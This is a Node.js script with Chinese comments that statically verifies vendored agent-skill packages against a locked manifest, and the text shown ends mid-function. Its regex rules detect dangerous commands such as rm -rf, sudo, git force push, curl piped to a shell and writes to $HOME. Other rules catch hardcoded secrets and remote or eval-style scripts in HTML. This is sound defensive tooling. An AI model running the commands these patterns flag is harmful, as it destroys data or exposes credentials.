/**
 * verify-external-skills.mjs — 外部（vendor）Agent Skills 只读静态校验门。
 *
 * 权威依据（只读引用，不修改它们）：
 *   - docs/external-skills.md           项目级强制治理政策（8 条红线 / 优先级）
 *   - docs/testing/external-skills-acceptance.md  独立测试专家冻结的验收矩阵（域 A–J）
 *   - AGENTS.md 第 6/6A 节              上游只读 / 不可逆动作须人工确认硬红线
 *   - vendor/agent-skills/mattpocock/manifest.json  锁定来源 commit + 文件指纹 + entry/依赖关系
 *
 * 多 vendor：VENDOR_PROFILES 显式注册 allowlist（不全局放宽任意 license / 脚本类型）。
 *   - mattpocock：strict 原样保留（MIT / LICENSE / 固定 4 entry / 仅 .md+.yaml / 依赖纪律 exposed:false+pureDoc）；
 *   - oil-oil：显式注册 Apache-2.0 / LICENSE.txt / 单 entry；.json=静态测试数据（须合法 JSON）、
 *     .html=静态文档模板（无远程 script src、无 fetch/XHR/eval/new Function/document.write/动态 import）。
 * 本脚本做什么（纯 Node 内置、只读、离线、确定性、幂等）：
 *   1. manifest schema / source.commit 精确 40-hex / license.spdx 与 license.file 须等于该 profile 注册值；
 *   2. entrySkillIds 集合须精确等于 profile.expectedEntryIds，且与 skills[].kind==="entry" 一致（entry 注入拒）；
 *   3. 依赖纪律（mattpocock）：只允许 manifest 显式声明的 pureDocumentation + exposed:false 依赖；
 *   4. vendored 树与 manifest 白名单逐文件对齐：无额外 / 无缺失 / 无 symlink / 无路径穿越（..、绝对路径、反斜杠）；
 *   5. 每个文件 sha256 + bytes 与 manifest 逐位相等（篡改/漂移/缺文件均 FAIL）；
 *   6. 扩展名/根文件按 profile 白名单；禁脚本 / 二进制 / shebang / +x；非注册同级目录仅 SKIPPED_UNREGISTERED 留痕；
 *   7. 每个 SKILL.md 有 YAML frontmatter（name+description），且 name === skill id === 目录名；
 *   8. Markdown 内相对文件引用必须：vendored 内存在（按文件目录与 skill 根双基准解析），或在 manifest
 *      excludedArtifacts/riskList/note/externalProjectReferences 中声明为外部；
 *   9. 政策优先字段（projectRulesPrecedence / noInstallerRun / noHomeOrGlobalWrites）为 true；
 *  10. 危险指令静态分类 F0/F1/F2：真·可执行 force push / sudo / rm -rf / home 写 / 凭据外泄 = F1(FAIL)，
 *      教学反例 / 否定式警示 / env 读取 / riskList 已声明 = F0（不算缺陷，仅记录分类）。
 *
 * 本脚本绝不做什么（ES-H4 / 红线）：
 *   - 不联网、不执行 / 不 import / 不 eval 任何 vendored 内容（无 child_process、无 eval）；
 *   - 不修改 vendor / docs / 产品代码；不读取 / 不打印任何环境凭据；
 *   - 只对 vendored 上游文件做正则扫描，绝不扫描 manifest.json 本身（它会正面列举"禁止事项"，扫描它会自伤）。
 *
 * 用法：
 *   node scripts/verify-external-skills.mjs            # 校验真实 vendor，PASS 退出 0，FAIL 退出 1 并打印可定位 diff
 *   node scripts/verify-external-skills.mjs --selftest # 在系统临时目录建负例夹具，验证本校验器能正确拒绝篡改
 */

import { fileURLToPath } from 'node:url'
import {
  existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, lstatSync, statSync,
  writeFileSync, symlinkSync,
} from 'node:fs'
import { dirname, join, relative, normalize, basename, extname, resolve, sep } from 'node:path'
import { createHash } from 'node:crypto'
import { tmpdir } from 'node:os'

// --- 路径：scripts/ 上三级 = 仓库根（packages/dsh-pm-tool/scripts -> pm-tool）---
const here = dirname(fileURLToPath(import.meta.url))
const REPO = join(here, '..', '..', '..')

const EXPECTED_SCHEMA_VERSION = 3                  // 最终契约：仅 schema3
const COMMIT_RE = /^[0-9a-f]{40}$/           // 精确全量 commit SHA，禁止 branch/tag 浮动

// --- 显式 vendor profile 注册表（只此两处放行；禁止全局放宽任意 license / 脚本类型）---
// mattpocock：既有 strict 规则原样保留（MIT / LICENSE / 固定 4 entry / 仅 md+yaml）。
// oil-oil：显式注册 Apache-2.0 / LICENSE.txt / 单 entry；.json=静态测试数据、.html=静态文档模板，
//          仍须逐文件锁在 manifest 指定清单内，且 html 过静态门（无远程脚本/无网络执行 API）。
export const VENDOR_PROFILES = {
  'mattpocock': {
    licenseSpdx: 'MIT',
    licenseFile: 'LICENSE',
    expectedEntryIds: ['grill-me', 'tdd', 'code-review', 'diagnosing-bugs'],
    allowedExt: new Set(['.md', '.yaml', '.yml']),
    allowedRootBase: new Set(['LICENSE']),
    dependencyDiscipline: true,
    allowJson: false,
    allowHtml: false,
  },
  'oil-oil': {
    licenseSpdx: 'Apache-2.0',
    licenseFile: 'LICENSE.txt',
    expectedEntryIds: ['oiloil-ui-ux-guide'],
    allowedExt: new Set(['.md', '.json', '.html']),
    allowedRootBase: new Set(['LICENSE.txt']),
    dependencyDiscipline: false,
    allowJson: true,
    allowHtml: true,
  },
}

// 危险指令规则（仅匹配"疑似危险"片段，再经 classifyHit 归类 F0/F1/F2）
// 注意：刻意要求命令上下文，避免把英文 "forces"、"keyword" 等词误伤为危险指令。
const DANGER_RULES = [
  { id: 'force-push', re: /\bgit\s+push\b[^\n;|]*?(?:--force(?:-with-lease)?|\s-f\b)/i },
  { id: 'sudo', re: /\bsudo\s+\S+/ },
  { id: 'rm-rf', re: /\brm\s+-[a-z]*r[a-z]*f[a-z]*\b|\brm\s+-[a-z]*f[a-z]*\b/ },
  { id: 'curl-pipe-sh', re: /\bcurl\b[^\n|]*\|\s*(?:bash|sh|zsh)\b/i },
  { id: 'home-write', re: /(?:>>|>|tee)\s*\$HOME\/|(?:>>|tee)\s*~\/\.?\S*|write[^\n]{0,24}\$HOME|echo[^\n]{0,16}>>\s*~/i },
  // 硬编码真实凭据字面量：要求 `key:"value12位以上"`；process.env.X 读取不算（见 classifyHit）
  { id: 'hardcoded-secret', re: /(?:api[_-]?key|secret|access[_-]?token|password)\s*[:=]\s*["'][A-Za-z0-9+_\/.\-]{12,}["']/i },
]

// F0（安全讨论/反例）标记：命中即降级为"不算缺陷"
const F0_MARKERS = [
  /切勿/, /不要/, /禁止/, /不得/, /避免/, /反例/, /反模式/, /错误示范/, /打错/, /常见事故/, /警示/, /注意：不要/,
  /\bnever\b/i, /\bdon'?t\b/i, /\bdo not\b/i, /\bavoid\b/i, /\bwithout\b/i, /\binstead of\b/i,
  /\brather than\b/i, /\bmistake\b/i, /\bwrong\b/i, /\bcaution\b/i, /\bshould not\b/i, /\bmust not\b/i,
  /\bwon'?t\b/i, /\be\.g\.?\b/i, /\bfor example\b/i, /\bexample\b/i, /\be\.g\b/i,
]

const sha256Of = (buf) => createHash('sha256').update(buf).digest('hex')

// ---------------------------------------------------------------------------
// 小工具
// ---------------------------------------------------------------------------

/** 递归收集目录下所有"普通文件"与"符号链接"的相对路径（POSIX 分隔）。不跟随 symlink。 */
function walkFiles(root) {
  const files = []   // { rel, abs, kind: 'file'|'symlink' }
  const rec = (dir, prefix) => {
    let ents
    try { ents = readdirSync(dir, { withFileTypes: true }) } catch { return }
    for (const e of ents) {
      const abs = join(dir, e.name)
      const rel = prefix ? prefix + '/' + e.name : e.name
      if (e.isSymbolicLink()) files.push({ rel, abs, kind: 'symlink' })
      else if (e.isDirectory()) rec(abs, rel)
      else if (e.isFile()) files.push({ rel, abs, kind: 'file' })
    }
  }
  rec(root, '')
  return files
}

/** 解析 SKILL.md 的 YAML frontmatter（极简：只取顶层标量 key: value）。返回 { ok, map, body }。 */
function parseFrontmatter(text) {
  const m = /^---\r?\n([\s\S]*?)\r?\n---\r?\n?/.exec(text)
  if (!m) return { ok: false, map: {}, body: text }
  const map = {}
  for (const line of m[1].split(/\r?\n/)) {
    const kv = /^([A-Za-z0-9_-]+)\s*:\s*(.*)$/.exec(line)
    if (!kv) continue
    let v = kv[2].trim()
    if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) v = v.slice(1, -1)
    if (v === 'true') v = true
    else if (v === 'false') v = false
    map[kv[1]] = v
  }
  return { ok: true, map, body: text.slice(m[0].length) }
}

/** 从 markdown 提取疑似"相对文件引用"（只认带扩展名/脚本目录的 backtick token）。 */
function extractRelativeRefs(text) {
  const refs = new Set()
  const re = /`([^`\n]+)`/g
  let m
  while ((m = re.exec(text))) {
    const tok = m[1].trim()
    if (!tok || tok.includes('://') || tok.startsWith('http') || tok.startsWith('/')) continue
    const looksLikeFile =
      /^[\w./-]+\.(md|ya?ml|json|sh|ts|js|py|bash)$/.test(tok) ||
      tok.startsWith('scripts/') || tok.startsWith('skills/') || tok.startsWith('./')
    if (looksLikeFile) refs.add(tok)
  }
  return [...refs]
}

/** 对一行命中的危险片段归类：F0=安全讨论/已声明，F1=真可执行危险指令(FAIL)。 */
function classifyHit({ ruleId, line, fileRel, declaredRiskFiles }) {
  // 1) manifest riskList 已显式声明此文件为"教学/正向" → F0-declared
  if (declaredRiskFiles.has(fileRel)) return 'F0-declared'
  // 2) 否定式/反例/举例语境 → F0
  if (F0_MARKERS.some((re) => re.test(line))) return 'F0'
  // 3) 凭据规则：若是"从 env 读取"而非硬编码字面量 → F0
  if (ruleId === 'hardcoded-secret' && /process\.env|os\.environ|environ|env var|environment variable|from env/i.test(line)) return 'F0'
  return 'F1'
}

/**
 * 静态 HTML 门（仅 profile.allowHtml 的 vendor 调用）：只做正则静态扫描，绝不执行。
 * FAIL：远程 <script src=http(s)>、网络执行 API（fetch/XHR/eval/new Function/document.write/动态 import）。
 * 本地相对 <script src>：须在磁盘存在，或在 manifest excluded/risk/note 中显式声明（如 agent 生成的 design-config.js）。
 * 被动 http(s) URL（w3.org 命名空间、preconnect 提示）只留痕 note，不算缺陷。
 */
function scanStaticHtml(rel, text, { add, notes, onDiskSet, declaredBlob }) {
  // 远程脚本 src（外部可执行载荷）
  if (/<script\b[^>]*\bsrc\s*=\s*["']https?:\/\//i.test(text)) {
    add('HTML_REMOTE_SCRIPT', `${rel}：含远程 <script src=http(s)>（外部可执行脚本），静态文档模板禁止`)
  }
  // 可执行 / 网络 API 载荷
  const execHits = [
    ['fetch', /\bfetch\s*\(/i],
    ['XMLHttpRequest', /\bXMLHttpRequest\b/],
    ['eval', /\beval\s*\(/],
    ['new Function', /\bnew\s+Function\s*\(/],
    ['document.write', /\bdocument\.write\s*\(/],
    ['dynamic import', /\bimport\s*\(/],
  ]
  for (const [label, re] of execHits) {
    if (re.test(text)) add('HTML_EXEC', `${rel}：含可执行/网络载荷 ${label}，静态文档模板禁止（不执行 vendored html）`)
  }
  // 本地相对 script src：磁盘存在或 manifest 显式声明
  const srcRe = /<script\b[^>]*\bsrc\s*=\s*["']([^"']+)["']/gi
  let m
  while ((m = srcRe.exec(text))) {
    const target = m[1]
    if (/^https?:\/\//i.test(target)) continue   // 远程已由 HTML_REMOTE_SCRIPT 处理
    const resolved = normalize(join(dirname(join('/', rel)), target)).split(sep).join('/').replace(/^\/+/, '')
    if (onDiskSet.has(resolved)) continue
    const declared = declaredBlob && (declaredBlob.includes(target) || declaredBlob.includes(basename(target)))
    if (declared) {
      notes.push(`[HTML-LOCAL-SRC] ${rel}: 本地脚本 "${target}" 非 vendored，已在 manifest 声明（agent 生成/会话临时）`)
    } else {
      add('REF_UNRESOLVED', `${rel}: 本地脚本 src "${target}" 既不在 vendored 树，也未在 manifest 声明`)
    }
  }
  // 被动 URL 留痕（不阻断，按 URL 去重，避免同一命名空间重复刷屏）
  const seenUrls = new Set()
  const urlRe = /https?:\/\/[^\s"'<>)]+/gi
  let u
  while ((u = urlRe.exec(text))) {
    const url = u[0].slice(0, 80)
    if (seenUrls.has(url)) continue
    seenUrls.add(url)
    notes.push(`[HTML-URL-PASSIVE] ${rel}: 被动引用 ${url}（静态文本/命名空间/preconnect，非执行）`)
  }
}

// ---------------------------------------------------------------------------
// 核心校验：对一个 vendor 根做只读静态检查，返回结构化结果（不直接 process.exit）
// ---------------------------------------------------------------------------
export function checkVendorRoot(vendorRoot, profile) {
  if (!profile || !profile.licenseSpdx || !Array.isArray(profile.expectedEntryIds)) {
    return { ok: false, errors: ['[PROFILE] 缺少合法 vendor profile（licenseSpdx / expectedEntryIds）'], notes: [], commit: null, fileCount: 0 }
  }
  const errors = []   // 阻断
  const notes = []    // 信息/分类留痕
  const add = (code, msg) => errors.push(`[${code}] ${msg}`)

  // --- 0. manifest 存在且为合法 JSON ---
  const manifestPath = join(vendorRoot, 'manifest.json')
  if (!existsSync(manifestPath)) {
    return { ok: false, errors: [`[MANIFEST_MISSING] 找不到 ${manifestPath}`], notes: [], commit: null, fileCount: 0 }
  }
  let manifest
  try {
    manifest = JSON.parse(readFileSync(manifestPath, 'utf8'))
  } catch (e) {
    return { ok: false, errors: [`[MANIFEST_JSON] manifest.json 不是合法 JSON: ${e.message}`], notes: [], commit: null, fileCount: 0 }
  }

  // --- 1. schemaVersion（最终契约仅 schema3）---
  if (manifest.schemaVersion !== EXPECTED_SCHEMA_VERSION) {
    add('SCHEMA', `schemaVersion=${JSON.stringify(manifest.schemaVersion)}，本校验器仅支持 schema${EXPECTED_SCHEMA_VERSION}（最终契约）`)
  }

  // --- 2. source：repo + 精确 commit + fetchedAt ---
  const src = manifest.source || {}
  if (typeof src.repo !== 'string' || !/^https?:\/\/.+/.test(src.repo)) add('SOURCE_REPO', 'source.repo 缺失或不是 http(s) URL')
  if (typeof src.commit !== 'string' || !COMMIT_RE.test(src.commit)) {
    add('SOURCE_COMMIT', `source.commit 必须是精确 40-hex 全量 SHA（禁止分支/标签浮动），实际=${JSON.stringify(src.commit)}`)
  }
  if (!src.fetchedAtUtc) add('SOURCE_FETCHED', 'source.fetchedAtUtc 缺失')
  const commit = typeof src.commit === 'string' && COMMIT_RE.test(src.commit) ? src.commit : null

  // --- 3. license：按 profile 显式登记的 spdx 与文件名（不全局接受任意 license）---
  const lic = manifest.license || {}
  if (lic.spdx !== profile.licenseSpdx) {
    add('LICENSE_SPDX', `license.spdx 必须为注册 profile 指定的 ${JSON.stringify(profile.licenseSpdx)}，实际=${JSON.stringify(lic.spdx)}；禁止 GPL/AGPL/LGPL copyleft，也不得冒充其他宽松许可`)
  }
  const licFile = lic.file ?? lic.vendoredAt
  if (licFile !== profile.licenseFile) {
    add('LICENSE_FILE', `license.file 必须为 ${JSON.stringify(profile.licenseFile)}（profile=${Object.keys(VENDOR_PROFILES).join('/')}），实际=${JSON.stringify(licFile)}`)
  }

  // --- 4. 政策优先字段 ---
  const pol = manifest.policy || {}
  if (pol.projectRulesPrecedence !== true) add('POLICY', 'policy.projectRulesPrecedence 必须为 true（项目规则优先于上游 skill）')
  if (pol.noInstallerRun !== true) add('POLICY', 'policy.noInstallerRun 必须为 true（不得自动运行上游 installer/setup）')
  if (pol.noHomeOrGlobalWrites !== true) add('POLICY', 'policy.noHomeOrGlobalWrites 必须为 true（不写 home/全局配置）')
  const prp = manifest.projectRulesPriority || {}
  if (!prp.statement) add('POLICY', 'projectRulesPriority.statement 缺失')
  if (!prp.conflictResolution) add('POLICY', 'projectRulesPriority.conflictResolution 缺失')

  // --- 5. 汇总 manifest 声明的文件清单（rootFiles + 各 skill files[]），并做路径安全校验 ---
  const declaredFiles = new Map()   // rel(posix) -> { sha256, bytes }
  /** 路径安全：拒绝绝对路径、反斜杠、.. 穿越；规范化后必须仍落在 vendor 根内。 */
  const safeDeclaredPath = (rel) => {
    if (typeof rel !== 'string' || !rel) return false
    if (rel.startsWith('/') || rel.includes('\\') || /^[A-Za-z]:/.test(rel)) return false
    const segs = normalize(rel).split(sep).join('/').split('/')
    if (segs.includes('..')) return false
    const resolved = resolve(vendorRoot, normalize(rel))
    const rootResolved = resolve(vendorRoot)
    const relOut = relative(rootResolved, resolved)
    if (relOut.startsWith('..') || resolve(rootResolved, relOut) !== resolved) return false
    return true
  }
  const registerDeclared = (rel, entry) => {
    if (!safeDeclaredPath(rel)) {
      add('PATH_TRAVERSAL', `manifest 声明路径越界/穿越：${JSON.stringify(rel)}（拒绝绝对路径、反斜杠、.. 段）`)
      return
    }
    declaredFiles.set(rel, { sha256: entry?.sha256, bytes: entry?.bytes })
  }
  const rootFiles = Array.isArray(manifest.rootFiles) ? manifest.rootFiles : []
  for (const rf of rootFiles) {
    if (rf && typeof rf.path === 'string') registerDeclared(rf.path, rf)
  }
  const skills = Array.isArray(manifest.skills) ? manifest.skills : []
  // 最终 schema3 仅认 s.files 字段（不回退 vendoredFiles，避免旧格式漂移通过）
  const skillFiles = (s) => {
    if (!Array.isArray(s.files)) { add('FILES_FIELD', `skills["${s.id}"] 缺少 files[]（schema3 仅认 files 字段，不认 vendoredFiles）`); return [] }
    return s.files
  }
  for (const s of skills) {
    for (const vf of skillFiles(s)) {
      if (vf && typeof vf.path === 'string') registerDeclared(vf.path, vf)
    }
  }

  // --- 6. entrySkillIds 集合精确等于政策固定的四个（O-D：非仅计数=4），且与 kind=entry 一致 ---
  const entryIds = Array.isArray(manifest.entrySkillIds) ? manifest.entrySkillIds : []
  if (new Set(entryIds).size !== entryIds.length) add('ENTRY_DUP', 'entrySkillIds 存在重复 id')
  const expectedEntryIds = profile.expectedEntryIds
  const expectedSet = new Set(expectedEntryIds)
  const missingEntries = expectedEntryIds.filter((id) => !entryIds.includes(id))
  const extraEntries = entryIds.filter((id) => !expectedSet.has(id))
  if (missingEntries.length || extraEntries.length) {
    add('ENTRY_SET', `entrySkillIds 集合必须精确等于 ${JSON.stringify(expectedEntryIds)}；缺失=${JSON.stringify(missingEntries)} 多余=${JSON.stringify(extraEntries)}`)
  }
  const skillById = new Map(skills.map((s) => [s.id, s]))
  for (const id of entryIds) {
    if (!skillById.has(id)) add('ENTRY_UNDECLARED', `entrySkillIds 中的 "${id}" 在 skills[] 中无对应条目`)
    else if (skillById.get(id).kind !== 'entry') add('ENTRY_KIND', `skills["${id}"].kind 必须为 "entry"（因它在 entrySkillIds 中）`)
  }
  for (const s of skills) {
    if (s.kind === 'entry' && !entryIds.includes(s.id)) add('ENTRY_KIND', `skills["${s.id}"].kind="entry" 但未列入 entrySkillIds`)
  }

  // --- 7. 依赖纪律：只允许 declaredDependencies 声明的 pureDocumentation+exposed:false 依赖 ---
  const declaredDeps = Array.isArray(manifest.declaredDependencies) ? manifest.declaredDependencies : []
  const depDeclared = new Set()
  for (const d of declaredDeps) {
    if (!d || typeof d.dependencySkillId !== 'string') continue
    depDeclared.add(d.dependencySkillId)
    // 依赖纪律（exposed:false / pureDocumentation / 归属）仅对开启该纪律的 profile 强制；
    // oil-oil 单 entry 无依赖，不套用 mattpocock 的依赖字段要求。
    if (profile.dependencyDiscipline) {
      if (d.exposed !== false) add('DEP_EXPOSED', `依赖 "${d.dependencySkillId}" 必须 exposed:false（不得作为公开 entry）`)
      if (d.pureDocumentation !== true) add('DEP_PUREDOC', `依赖 "${d.dependencySkillId}" 必须 pureDocumentation:true（纯文档，无可执行代码）`)
      if (typeof d.entrySkillId !== 'string' || !skillById.has(d.entrySkillId)) add('DEP_REL', `依赖 "${d.dependencySkillId}" 缺少有效的 entrySkillId 归属关系`)
    }
  }
  for (const s of skills) {
    if (entryIds.includes(s.id)) continue           // entry，跳过
    // 非 entry 的 skill 必须是"已声明依赖"（未声明的额外 skill = 越界，所有 profile 通用）
    if (!depDeclared.has(s.id)) {
      add('DEP_UNDECLARED', `skills["${s.id}"] 既不是 entry 也未在 declaredDependencies 中声明（未声明的额外 skill = 越界）`)
    } else if (profile.dependencyDiscipline) {
      if (s.kind !== 'dependency') add('DEP_KIND', `依赖 skills["${s.id}"].kind 必须为 "dependency"`)
      if (s.exposed !== false) add('DEP_EXPOSED', `依赖 skills["${s.id}"].exposed 必须为 false`)
    }
  }

  // --- 8. 磁盘树：symlink 扫描 + 文件集合对齐 + 指纹/字节/扩展名/权限 ---
  const onDisk = walkFiles(vendorRoot)
  // 磁盘侧预期集合（不含根 manifest.json，它是注册表本体）
  const diskFiles = onDisk.filter((f) => f.rel !== 'manifest.json')
  const onDiskSet = new Set(diskFiles.filter((f) => f.kind === 'file').map((f) => f.rel))

  // 8a. symlink 一律 FAIL
  for (const f of onDisk.filter((x) => x.kind === 'symlink')) {
    add('SYMLINK', `vendored 树禁止符号链接：${f.rel}`)
  }

  // 8b. 额外文件（磁盘有、manifest 未声明）
  for (const rel of [...onDiskSet].sort()) {
    if (!declaredFiles.has(rel)) add('EXTRA_FILE', `manifest 未声明的额外文件（越界/夹带）：${rel}`)
  }
  // 8c. 缺失文件（manifest 声明、磁盘没有）
  for (const rel of [...declaredFiles.keys()].sort()) {
    if (!onDiskSet.has(rel)) add('MISSING_FILE', `manifest 声明但磁盘缺失：${rel}`)
  }

  // 8d. 逐文件：sha256 + bytes + 扩展名白名单 + 权限 + shebang
  for (const f of diskFiles) {
    const rel = f.rel
    const decl = declaredFiles.get(rel)
    const buf = readFileSync(f.abs)
    const bytes = buf.length
    const hash = sha256Of(buf)

    // 扩展名 / base 白名单（按 profile；不全局放行脚本/二进制）
    const base = basename(rel)
    const ext = extname(rel).toLowerCase()
    const allowedExt = profile.allowedExt.has(ext)
    const allowedBase = profile.allowedRootBase.has(base)
    if (!allowedExt && !allowedBase) {
      add('FORBIDDEN_FILE_TYPE', `${rel}：扩展名/文件类型不允许（本 profile 仅 ${[...profile.allowedExt].join('/')} + 根 ${[...profile.allowedRootBase].join('/')}；禁止 .sh/.py/.js/.mjs/package.json/二进制）`)
    }

    // .json 仅在 profile 显式 allowJson 时放行，且必须是合法静态数据（不执行）
    if (ext === '.json') {
      if (!profile.allowJson) {
        add('FORBIDDEN_FILE_TYPE', `${rel}：本 profile 不放行 .json（仅锁 manifest 指定的静态数据文件）`)
      } else {
        try { JSON.parse(buf.toString('utf8')) }
        catch (e) { add('JSON_MALFORMED', `${rel}：.json 不是合法静态 JSON（${e.message}）`) }
      }
    }

    // .html 仅在 profile 显式 allowHtml 时放行，且必须是静态文档模板（无远程脚本/无网络执行 API）
    if (ext === '.html') {
      if (!profile.allowHtml) {
        add('FORBIDDEN_FILE_TYPE', `${rel}：本 profile 不放行 .html`)
      } else {
        const declaredBlob = JSON.stringify({
          excludedArtifacts: manifest.excludedArtifacts,
          externalProjectReferences: manifest.externalProjectReferences,
          riskList: manifest.riskList,
          skills: skills.map((s) => ({ note: s.note, reviewNotes: s.reviewNotes, riskNotes: s.riskNotes, externalProjectReferences: s.externalProjectReferences })),
        })
        scanStaticHtml(rel, buf.toString('utf8'), { add, notes, onDiskSet, declaredBlob })
      }
    }

    // 可执行位
    let mode = 0
    try { mode = statSync(f.abs).mode & 0o111 } catch {}
    if (mode !== 0) add('EXEC_BIT', `${rel} 带可执行位（mode & 0o111 = ${mode.toString(8)}），vendored 纯文本不得可执行`)

    // shebang
    if (buf.length && buf.subarray(0, 2).toString('utf8') === '#!') {
      add('SHEBANG', `${rel} 含 shebang 行（#!），视为可执行载荷，禁止 vendored`)
    }

    // 指纹
    if (decl) {
      if (decl.bytes !== bytes) add('HASH', `${rel} bytes 不符：manifest=${decl.bytes} 实际=${bytes}`)
      if (decl.sha256 !== hash) add('HASH', `${rel} sha256 漂移：manifest=${decl.sha256} 实际=${hash}`)
    }
  }

  // --- 9. 每个 skill 的 SKILL.md frontmatter：name/description，且 name===id===目录名 ---
  for (const s of skills) {
    const skillDirRel = `skills/${s.id}`
    const skillMdRel = `${skillDirRel}/SKILL.md`
    if (!onDiskSet.has(skillMdRel)) {
      add('FRONTMATTER', `skills["${s.id}"] 缺少 ${skillMdRel}`)
      continue
    }
    const text = readFileSync(join(vendorRoot, skillMdRel), 'utf8')
    const fm = parseFrontmatter(text)
    if (!fm.ok) add('FRONTMATTER', `${skillMdRel} 缺少 YAML frontmatter（开头需 ---\n...\n---）`)
    else {
      if (!fm.map.name || typeof fm.map.name !== 'string') add('FRONTMATTER', `${skillMdRel} frontmatter 缺 name`)
      else if (fm.map.name !== s.id) add('FRONTMATTER', `${skillMdRel} frontmatter name=${JSON.stringify(fm.map.name)} !== skill id=${JSON.stringify(s.id)}`)
      if (!fm.map.description || typeof fm.map.description !== 'string') add('FRONTMATTER', `${skillMdRel} frontmatter 缺 description`)
    }
    // 目录名 === id
    const dirName = basename(skillDirRel)
    if (dirName !== s.id) add('FRONTMATTER', `目录名 ${dirName} !== skill id ${s.id}`)
  }

  // --- 10. 相对文件引用：必须 vendored 内存在，或在 manifest 显式声明为外部 ---
  // 声明来源（兼容最终 schema）：excludedArtifacts、可选 externalProjectReferences、
  // 可选 riskList，以及每个 skill 的 note / reviewNotes / riskNotes。
  const declBlob = JSON.stringify({
    excludedArtifacts: manifest.excludedArtifacts,
    externalProjectReferences: manifest.externalProjectReferences,
    riskList: manifest.riskList,
    skills: skills.map((s) => ({
      note: s.note, reviewNotes: s.reviewNotes, riskNotes: s.riskNotes,
      externalProjectReferences: s.externalProjectReferences,
    })),
  })
  const riskList = Array.isArray(manifest.riskList) ? manifest.riskList : []
  const riskFiles = new Set(riskList.map((r) => (r && typeof r.file === 'string' ? r.file : null)).filter(Boolean))
  for (const f of diskFiles.filter((x) => extname(x.rel).toLowerCase() === '.md')) {
    const text = readFileSync(f.abs, 'utf8')
    const dirOfFile = dirname(join(vendorRoot, f.rel))
    // skill 根（skills/<id>/）作为第二解析基准：上游文档常以 references/xxx.md 从 skill 根书写，
    // 而非相对当前 references/ 文件，避免 references/references/ 双重前缀误判未解析。
    const skillRoot = dirname(dirname(join(vendorRoot, f.rel)))
    for (const ref of extractRelativeRefs(text)) {
      const candidates = [dirOfFile, skillRoot].map((base) => {
        const resolved = normalize(join(base, ref))
        return relative(vendorRoot, resolved).split(sep).join('/')
      })
      if (candidates.some((relResolved) => onDiskSet.has(relResolved))) continue   // vendored 内存在 → OK
      const relResolved = candidates[0]
      // 不在 vendor 内：必须在 manifest 显式声明（不做"裸 .md 自动放行"，保持严格）
      const base = basename(ref)
      const declaredExternal =
        declBlob.includes(ref) || declBlob.includes(base) || riskFiles.has(relResolved)
      if (declaredExternal) {
        notes.push(`[REF-EXTERNAL] ${f.rel}: 引用 "${ref}" 非 vendored，已在 manifest excluded/risk/note/externalProjectReferences 中声明`)
      } else {
        add('REF_UNRESOLVED', `${f.rel}: 相对引用 "${ref}" 既不在 vendored 树，也未在 manifest 中声明（须在 riskNotes/note/excludedArtifacts/externalProjectReferences 显式登记）`)
      }
    }
  }

  // --- 11. 危险指令静态分类（只扫 vendored 上游文件，不扫 manifest.json）---
  // declaredRiskFiles = riskList[].file 精确 rel + 被 riskNotes 点名的"特定"文件名
  // （SKILL.md/openai.yaml 这类通用名不自动豁免，避免给真·SKILL.md 危险指令开后门）。
  const GENERIC_BASENAMES = new Set(['SKILL.md', 'openai.yaml'])
  const declaredRiskFiles = new Set(riskFiles)
  for (const f of diskFiles) {
    const b = basename(f.rel)
    if (GENERIC_BASENAMES.has(b)) continue
    if (declBlob.includes(b)) declaredRiskFiles.add(f.rel)
  }
  for (const f of diskFiles) {
    if (f.rel === 'LICENSE') continue
    const text = readFileSync(f.abs, 'utf8')
    const lines = text.split(/\r?\n/)
    lines.forEach((line, idx) => {
      for (const rule of DANGER_RULES) {
        if (!rule.re.test(line)) continue
        const cls = classifyHit({
          ruleId: rule.id,
          line,
          fileRel: f.rel,
          declaredRiskFiles,
        })
        if (cls === 'F1') {
          add('DANGER_F1', `${f.rel}:${idx + 1} [${rule.id}] 疑似可执行危险指令 → ${line.trim().slice(0, 160)}`)
        } else {
          notes.push(`[${cls}] ${f.rel}:${idx + 1} [${rule.id}] 已归类为安全讨论/反例（不算缺陷）→ ${line.trim().slice(0, 120)}`)
        }
      }
    })
  }

  return {
    ok: errors.length === 0,
    errors,
    notes,
    commit,
    fileCount: onDiskSet.size,
    entryCount: entryIds.length,
    declaredDepCount: declaredDeps.length,
  }
}

// ---------------------------------------------------------------------------
// 多 vendor 扫描：遍历 vendor/agent-skills 下一级目录，只认显式注册 profile；
// 未注册目录（夹带/未知 vendor）→ UNKNOWN_VENDOR 拒；注册但缺失 → MISSING_VENDOR 拒。
// ---------------------------------------------------------------------------
export function scanVendorRoots(agentSkillsDir) {
  const errors = []
  const notes = []
  const perVendor = []
  let entries = []
  try {
    entries = readdirSync(agentSkillsDir, { withFileTypes: true })
      .filter((e) => e.isDirectory())
      .map((e) => e.name)
  } catch {
    return { ok: false, errors: [`[VENDOR_DIR] 读不到 ${agentSkillsDir}`], notes: [], perVendor: [] }
  }
  const onDiskDirs = new Set(entries)
  for (const [vendorName, profile] of Object.entries(VENDOR_PROFILES)) {
    if (!onDiskDirs.has(vendorName)) {
      errors.push(`[MISSING_VENDOR] 注册 profile "${vendorName}" 目录缺失：${join(agentSkillsDir, vendorName)}`)
      continue
    }
    const r = checkVendorRoot(join(agentSkillsDir, vendorName), profile)
    perVendor.push({ vendorName, ...r })
    errors.push(...r.errors.map((e) => `[${vendorName}] ${e}`))
    notes.push(...r.notes.map((n) => `[${vendorName}] ${n}`))
  }
  // 未注册的同级目录：本静态门只审计显式注册 profile，不越权审计/也不据此 FAIL；
  // 记 SKIPPED_UNREGISTERED 留痕（夹带检测由各注册树内的 EXTRA_FILE/MISSING_FILE 负责）。
  for (const name of entries) {
    if (!VENDOR_PROFILES[name]) {
      notes.push(`[SKIPPED_UNREGISTERED] "${name}" 不在本校验器显式 profile allowlist，跳过（不由本门审计；不得在该树内夹带注册文件）`)
    }
  }
  return { ok: errors.length === 0, errors, notes, perVendor }
}

// ---------------------------------------------------------------------------
// selftest：在系统临时目录建负例夹具，验证本校验器能正确拒绝篡改
// ---------------------------------------------------------------------------
function buildFixtureDir() {
  const dir = mkdtempSync(join(tmpdir(), 'verify-external-skills-fixture-'))
  return dir
}

function writeTree(dir, relToContent) {
  for (const [rel, content] of Object.entries(relToContent)) {
    const abs = join(dir, rel)
    mkdirSync(dirname(abs), { recursive: true })
    // symlink 夹具：content 为 { __symlink: target }
    if (content && typeof content === 'object' && content.__symlink) {
